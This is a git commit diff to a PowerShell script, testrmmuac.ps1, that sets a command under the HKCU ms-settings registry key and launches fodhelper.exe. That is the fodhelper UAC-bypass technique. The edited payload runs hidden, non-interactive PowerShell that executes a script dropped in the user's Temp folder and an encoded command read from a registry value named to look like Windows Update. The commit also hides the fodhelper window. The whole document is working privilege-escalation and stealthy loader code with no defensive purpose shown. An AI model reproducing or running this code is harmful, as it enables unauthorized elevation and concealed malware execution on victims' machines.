42b6b92ac5150d52c6935967bb867608d98787bc
IndianAlu <143686138+IndianAlu@users.noreply.github.com>
2024-03-20 09:29:40 +0500

    Update testrmmuac.ps1

--- testrmmuac.ps1
+++ testrmmuac.ps1
@@ -1,11 +1,5 @@
 
-           
-    #$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
-      
-    $program = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x' #default
-    
-    #$program = "C:\Users\H3X\AppData\Local\Temp\DownloadedFile.ps1";
-     $program = "C:\Users\$env:USERNAME\AppData\Local\Temp\DownloadedFile.ps1"
+    $program = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -File "C:\Users\$env:USERNAME\AppData\Local\Temp\DownloadedFile.ps1" -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x'  #default
 
     #Create Registry Structure
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
@@ -13,7 +7,7 @@
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
  
     #Start fodhelper.exe
-    Start-Process "C:\Windows\System32\fodhelper.exe" #-WindowStyle Hidden
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
  
     #Cleanup
     #Start-Sleep 3
